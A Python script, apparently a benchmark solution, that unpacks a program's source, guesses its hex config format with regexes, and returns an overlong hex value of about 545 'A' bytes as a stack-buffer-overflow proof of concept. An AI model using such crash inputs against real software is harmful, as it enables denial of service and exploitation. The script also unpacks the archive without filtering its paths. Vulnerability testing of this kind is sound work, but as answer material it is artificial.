import os
import re
import tarfile
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for source files to understand the format
            source_root = self._find_source_root(tmpdir)
            config_format = self._analyze_config_format(source_root)
            
            # Generate PoC based on analyzed format
            if config_format == "hex_value":
                # Simple hex value overflow
                poc = b"0x" + b"A" * 545
            elif config_format == "key_value_hex":
                # Key=0x<hex> format
                poc = b"param=0x" + b"A" * 539
            elif config_format == "config_hex_line":
                # CONFIG_HEX=0x<hex> format
                poc = b"CONFIG_HEX=0x" + b"A" * 533
            else:
                # Default: try multiple formats
                poc = self._generate_overflow_payload()
            
            return poc
    
    def _find_source_root(self, tmpdir: str) -> str:
        """Find the main source directory in extracted tarball."""
        for root, dirs, files in os.walk(tmpdir):
            # Look for C source files or Makefile
            c_files = [f for f in files if f.endswith(('.c', '.cpp', '.cc'))]
            if c_files or 'Makefile' in files or 'makefile' in files:
                return root
        return tmpdir
    
    def _analyze_config_format(self, source_dir: str) -> str:
        """Analyze source code to determine config file format."""
        # Look for patterns in source files
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.h')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Check for hex parsing patterns
                            if re.search(r'0x[0-9a-fA-F]+', content):
                                if re.search(r'strtol|strtoul|sscanf.*%x', content, re.IGNORECASE):
                                    # Look for config parsing patterns
                                    if re.search(r'config.*=.*0x|CONFIG.*=.*0x', content, re.IGNORECASE):
                                        return "config_hex_line"
                                    elif re.search(r'param.*=.*0x|key.*=.*0x', content, re.IGNORECASE):
                                        return "key_value_hex"
                                    else:
                                        return "hex_value"
                    except:
                        continue
        return "unknown"
    
    def _generate_overflow_payload(self) -> bytes:
        """Generate a generic stack buffer overflow payload."""
        # Create a payload with a long hex value that should trigger overflow
        # Format: 0x followed by many hex digits (total 547 bytes)
        hex_length = 545  # 547 total - 2 for "0x"
        hex_digits = b"41" * (hex_length // 2)  # "41" is hex for 'A'
        if hex_length % 2:
            hex_digits += b"4"  # Add one more hex digit if odd length
        
        return b"0x" + hex_digits